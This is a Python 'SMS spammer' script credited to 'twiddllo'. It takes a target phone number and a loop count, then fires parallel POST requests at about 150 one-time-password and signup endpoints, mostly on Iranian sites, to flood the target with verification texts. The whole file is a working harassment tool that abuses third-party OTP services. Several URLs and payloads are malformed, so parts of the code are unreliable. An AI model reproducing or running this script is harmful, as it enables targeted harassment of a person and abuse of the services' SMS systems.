

             ##########################                       
             #    MADE BY TWIDDLLO    #                        
             ##########################                      



import requests
import os
import subprocess
import time
from multiprocessing import Process, Queue
from colorama import Fore

def clear_screen():
    if os.name == 'nt':
        subprocess.call('cls', shell=True)

def sms(url, header, queue):
    time.sleep(1)
    try:
        response = requests.post(url, json=header)
        response.raise_for_status()  
        queue.put(response.status_code)
    except requests.exceptions.HTTPError as e:
        print("\033[01;31m[-] Error: {}".format(e))
        queue.put(response.status_code)

def main():
    clear_screen()
    print("\033[01;33m")

    print(''' 


        █▀ █▀▄▀█ █▀   █▀ █▀█ ▄▀█ █▀▄▀█ █▀▄▀█ █▀▀ █▀█
        ██ █ ▀ █ ██   ██ █▀▀ █▀█ █ ▀ █ █ ▀ █ ███ ██▀
        ▄█ █   █ ▄█   ▄█ █   █ █ █   █ █   █ █▄▄ █ █
          
                    made by twiddllo
             discord: https://discord.gg/qaz
          
    ''')
    
    phone = input("\033[01;31m[\033[01;32mV\033[01;31m] \033[01;32mEnter target phone number. [Ex: 09*********] \033[00;36m")

    repeat_count = int(input("\033[01;31m[\033;V\033[01;31m] \033[01;32m how many times you want to loop this progress?: \033[00;36m"))

    ch = Queue()

    processes = []

    api_list = [
    ("https://snappq.com/api/v2/register/otp", {"mobile": phone}),
    ("https://khaasfood.com/", {"phone": phone}),
    ("https://dicardo.com/main/sendsms", {"phone": phone}),
    ("https://api.mdarman.ir/api/verification", {"phone": phone}),
    ("https://takfarsh.com/wp-content/themes/bakala/template-parts/send.php", {"phone_email": phone}),
    ("https://www.khanoumi.com/accounts/sendotp", {"mobile": phone}),
    ("https://yektanet.com/api/v3/auth/sendPhone", {"phoneNumber": phone}),
    ("https://www.cancelling.com/online/phone[Punctuation Marker]submit.php(Base URL)", {"phone": phone}),
    ("https://api.digikala.com/v1/user/authenticate/", {"username": phone}),
    ("https://1401api.tamland.ir/api/user/signup", {"Mobile": phone}),
    ("https://jaljale.com/api/auth/sendOtp", {"mobile": phone}),
    ("https://api.kartmo.ir/api/v1/users/verification-code", {"phone": phone}),
    ("https://nobat.ir/api/public/patient/login/phone", {"mobile": phone}),
    ("https://kafegheymat.com/shop/getLoginSms", {"phone": phone}),
    ("https://secure.dandelion.app/api/v1/login", {"phone": phone}),
    ("https://plus.leonstore.co/auth/otp/generate", {"phone": phone}),
    ("https://farvi.shop/api/v1/sessions/login_request", {"mobile_phone": phone}),
    ("https://my.ant-api.ir/api/otp/auth/send", {"phone": phone}),
    ("https://www.irantic.com/api/login/request", {"mobile": phone}),
    ("https://login.rubika.ir/v1/otp/send", {"phone_number": phone}),
    ("https://www.iranketab.ir/account/register", {"UserName": phone}),
    ("https://api.panel.begamdid.ir/api/token/sendSms", {"phone": phone}),
    ("https://api.timcheh.com/auth/otp/send", {"mobile": phone}),
    ("https://api.shad.ir/auth/register", {"phone_number": phone}),
    ("https://stream.jamejamonline.ir/api/v1/otp/send", {"cellphone": phone}),
    ("https://www.khoone.ir/api/sendVerifyCode", {"mobile": phone}),
    ("https/coinava.com/verify-request", {"cellphone": phone}),
    ("https/ravizparvaz.com/public/signup", {"phone": phone}),
    ("https://api.2see.ir/app/one/auth/verify", {"mobile": phone}),
    ("https://khaaneh-beauty.com/auth/otp", {"mobile": phone}),
    ("https://api.rokla.ir/api/request/otp", {"mobile": phone}),
    ("https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode", {"userName": phone}),
    ("https://www.buskool.com/send_verification_code", {"phone": phone}),
    ("https://hiword.ir/wp-json/otp-login/v1/login", {"identifier": phone}),
    ("https://panel.salehrahgozar.com/api/otp", {"phone": phone}),
    ("https://shop.hyperjan.ir/api/users/manage", {"mobile": phone}),
    ("https://khatunabad.com/api/register", {"cellPhone": phone}),
    ("https://api.snapp.ir/api/v1/sms/link", {"phone": phone}),
    ("https://narenjestan-tesh.com/panel/api/generate-otp", {"phone_number": phone}),
    ("https://abantether.com/users/register/phone/send/", {"phoneNumber": phone}),
    ("https://mobogift.com/signin", {"username": phone}),
    ("https://melix.shop/site/api/v1/user/otp", {"mobile": phone}),
    ("https://osmrtnicama.ba/api/v1/otp-pm/entervc", {"phone": phone}),
    ("https://netafraz.com/landing-page/v1/otp/send", {"phoneNumber": phone}),
    ("https://api.snappcar.com/v2/driver/initial", {"phoneNumber": phone}),
    ("https://api.raybit.net:3111/api/v1/authentication/register/mobile", {"mobile": phone}),
    ("https://www.foodcenter.ir/account/sabtmobile", {f"mobile={phone}&__RequestVerificationToken=lqpAP86cm6ubwUoSRlGeHdrLJ90KhrBSHzLZ7_rAQ5dAZT-q__KWOkJ3TRoPtz8Q13HaLVCmcfsB1itFNtrvVbX0xWE1": phone}),
    ("https://auth.homtick.com/api/V1/User/GetVerifyCode", {f"'mobileOrEmail':{phone},'deviceCode':'d520c7a8-421b-4563-b955-f5abc56b97ec','firstName':'','lastName':'','password':''": phone}),
    ("https://app.kardoon.ir:4433/api/users", {f"'optype':15,'userid':0,'mobile':{phone},'firstname':'','lastname':'','cityid':0,'email':'','birthdate':'','gender':'False','avatarid':0,'packagename':'','versioncode':-1,'tokenkey':'','username':'','password':'','connectionname':'MainConStr'": phone}),
    ("https://abantether.com/users/register/phone/send/", {f"'phoneNumber':{phone},'email':''": phone}),
    ("https://amoomilad.demo-hoonammaharat.ir/api/v1.0/Account/Sendcode", {f"'Token':'5c486f96df46520d1e4d4a998515b1de02392c9b903a7734ec2798ec55be6e5c','DeviceId':1,'PhoneNumber':{phone},'Helper':77942": phone}),
    ("https://ashraafi.com/wp-admin/admin-ajax.php", {f"action=digits_check_mob&countrycode=%2B98&mobileNo={phone}&csrf=54dfdabe34&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail={phone}&dig_otp=&digits_login_remember_me=1&dig_nounce=54dfdabe34": phone}),
    ("https://sandbox.sibirani.ir/api/v1/user/invite", {"username": phone}),
    ("https://restaurant.delino.com/user/register", {'apiToken':'VyGjQdSafqC8fPTzq2XaU9cn', 'mobilenumber': phone}),
    ("https://banankala.com/home/login", {"Mobile": phone}),
    ("https://api.sonix.app/api/v1/entry/otp/generate", {"number": phone}),
    ("https://dayapp.me/client/register/send-verify-sms", {"phoneNumber": phone}),
    ("https://www.bia2voice.com/register", {"mobile": phone}),
    ("https://clientapp.hashbuz.com/rest-services/driver/v1/otp", {"cellNo": phone}),
    ("https://register.hm.com", {"phoneNumber": phone}),
    ("https://sapp.ir/panel/api/auth/otp", {"phone": phone}),
    ("https://dadpardaz.com/advice/getLoginConfirmationCode", {"mobile": phone}),
    ("https://www.digistyle.com/users/login-register/", {"loginRegister[email_phone]": phone}),
    ("https://support.pedamun.com/user-api/verify", {"phone": phone}),
    ("https://parksiha.com/auth/requestloginthruotp", {"userMobileNo-B64": phone, "total": "boy"}),
    ("https://www.delino.com/user/register", {"mobile": phone}),
    ("https://salarkala.com/auth/send-otp", {"mobile": phone}),
    ("https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode", {"'Parameters': {'ApplicationType': 'Web','ApplicationUniqueToken': None, 'ApplicationVersion': '1.0.0','MobileNumber': +": phone}),
    ("https://api.mycompany.group/auth/register", {"phone": phone}),
    ("https://pinket.com/api/cu/v2/phone-verification", {"phoneNumber": phone}),
    ("https://api.pezeshket.com/core/v1/auth/requestCode", {"mobileNumber": phone}),
    ("https://shop.beheshticarpet.com/my-account/", {"billing_mobile": phone}),
    ("https://api.aparat.com/fa/v1/fa/user/signup", {"phoneNumber": phone}),
    ("https://festival.payping.ir/req_api_v1/otp?phone_number=", phone),
    ("https://ketabchi.com/api/v1/auth/requestVerificationCode", {"phoneNumber": phone}),
    ("https://api.awesomedoor.com/v1/auth/send-code", {"mobile": phone}),
    ("https://www.hamgardi.com/api/v4/otps", {"cell_phone": phone}),
    ("https://ts1.travian.ir/dorf1.php", {"s": "3", "kid": "hq", "t": "10", "timestamp": str(int(time.time())), "newdid": "1", "ajaxtoken": "ajaxToken"}),
    ("https://bmi.ir/list-of-app-errors", {"mobilenumber=", phone}),
    ("https://api.digikalajet.ir/user/login-register/", {"phone": phone}),
    ("https://ebank.ir/api/sendSms", {"mobileNumber": phone}),
    ("https://www.offdecor.com/index.php?route=account/login/sendCode", {"phone": phone}),
    ("https://apimain.whoisiran.ir/api/Authentication/SendOtp", {"phoneNumber": phone}),
    ("https://novycargo.com/nc/api/app/clients-authenticate", {"phone": phone, "caller_phone": phone}),
    ("https/api.twpapp.com/user/getOtpForLogin", {"phoneNumber": phone}),
    ("https://vadaa.ir/api/v2/users/sendVerificationCode", {"phone": phone}),
    ("https://www.simkhanapi.ir/api/users/registerV2", {"mobileNumber": phone}),
    ("https://enamad.ir/api/vws/api/g", {"phone Marker": phone}),
    ("https://my.didban.com:1401/didban/users/otpsms", {"mobile": phone}),
    ("https://membership.homa.tv/mobile/verify", {"mobile": phone}),
    ("https://api.rayakm.com/api/register/username", {"username": phone}),
    ("https://sanatisharif.ir/api/checkUsername", {"cellphone": phone}),
    ("https://nasa-group.ir/nasa-tracker-v2/index.php?page&activesms=new&seldomain=1", {"phone_number": phone}),
    ("https://khodro45.com/api/v1/customers/otp/", {"mobile": phone}),
    ("https://barnamenevis.ensani.ir/api/phoneLogin", {"phone": phone}),
    ("https://rojashop.com/api/auth/sendOtp", {"mobile": phone}),
    ("https://panel.raychat.io/auth/otp", {"phone_number": phone}),
    ("https://virgool.io/api/v1.4/auth/verify", {"'method': 'phone', 'identifier'": phone}),
    ("https://client.api.paklean.com/user/resendCode", {"username": phone}),
    ("https://www.sheypoor.com/auth", {"username": phone}),
    ("https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL", {"mobile": phone}),
    ("https://emallpay.com/api/v1/auth/send-verification-sms", {"mobile": phone}),
    ("https://coinava.com/verify-request", {"cellphone": phone}),
    ("https://www.pubisha.com/login/checkCustomerActivation", {"mobile=": phone}),
    ("https://app.itoll.ir/api/v1/auth/login", {"mobile": phone}),
    ("https://ravizparvaz.com/public/signup", {"phone": phone}),
    ("https://api.vasapi.click/api/sms/otp-send", {"phone": phone}),
    ("https://quera.ir/wp-json/authy/v3/otp/request", {"phone_number": phone}),
    ("https://karafsapp.com/api/v2/auth/signup", {"phone": phone}),
    ("https://chamedoon.com/api/v1/membership/guest/request_mobile_verification", {"mobile": phone}),
    ("https://www.shayankala.ir/login", {"phoneNumber": phone}),
    ("https://api.faradadev.ir/v1/account/login", {"cellPhoneNumber": phone}),
    ("https://www.onlineshopping.ir/login", {"'method': 'phone', 'identifier'": phone}),
    ("https://admin.brayan.cloud/login", {"phone": phone}),
    ("https://rezaraygan.com/api/v2/Account/GetToken", {"mobile": phone}),
    ("https://vitrin.ariafishing.ir/", {"phone_number": phone}),
    ("https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile", {"mobile": phone}),
    ("https://forum.b2b.iran-khodro.ir/api/token", {"cellPhone": phone}),
    ("https://dash.kelidestan.com/api/manager/generateCode", {"phone": phone}),
    ("https://utico.net/verify/{Phone}", {"Phone": phone}),
    ("https://a4baz.com/api/web/login", {"cellphone": phone}),
    ("https://account.taban-kala.com/v1/otp/request", {"mobile_number": phone}),
    ("https://rahcham.ir/api/v1/users/request-otp", {"mobile": phone}),
    ("https://alefbalab.com/user/check-user", {"mobile": phone}),
    ("https://taxiarz.ir/user/register", {"mobile": phone}),
    ("https://alopeyk.com/api/sms/send.php", {"phone": phone}),
    ("https://cinematicket.org/api/v1/users/signup", {"phone_number": phone}),
    ("https://bit24.cash/app/api/auth/check-mobile", {"mobile": phone}),
    ("https://chat.flance.ir/api/account/guest/sendCode", {"phone": phone}),
    ("https://edu.marezadservice.ir/api/user/requestOtpCode", {"username": phone}),
    ("https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&optionalVersion=5.6.6&UDID=bb65d956-f88b-4fec-9911-5f94391edf85", {"cellphone": phone}),
    ("https://zowjtime.com/api/Auth/Login", {"mobile": phone}),
    ("https://jibigo.com/api/v1/sms/otp/verified/", {"field no" : phone}),
    ("https://www.bama.ir/ajax/v1/register/mobile/send", {"mobile": phone}),
    ("https/billetto.com/en/api/signup", {"phone": phone}),
    ("https://club.opco.co.ir/index.php?route=extension/module/login_verify/update_register_code", {"telephone": phone}),
    ("https://gw.taaghche.com/v4/site/auth/signup", {"contact": phone}),
    ("https://api.metal-ent.com/api/login", {"username": phone}),
    ("https://billetto.com/en/api/signup", {"phone": phone}),
    ("https://api.anargift.com/api/people/auth", {"user": phone}),
    ("https://apk.nizarnasehi.com/api/auth/verify", {"mobile": phone}),
    ("https://panel.quera.ir/wp-json/authy/v3/otp/request", {"phone_number": phone}),
    ("https://safiran.shop/login", {"mobile": phone}),


    ]

    for i in range(repeat_count):
        for api_url, api_header in api_list:
            process = Process(target=sms, args=(api_url, api_header, ch))
            processes.append(process)
            process.start()

    for process in processes:
        process.join()

    for i in range(repeat_count * len(api_list)):
        status_code = ch.get()
        if status_code == 404 or status_code == 400:
            print("\033[01;31m[X] Error ! ")
        else:
            print("\033[01;31m[\033[01;32mV\033[01;31m] \033[01;33mSent")

if __name__ == "__main__":
    main()
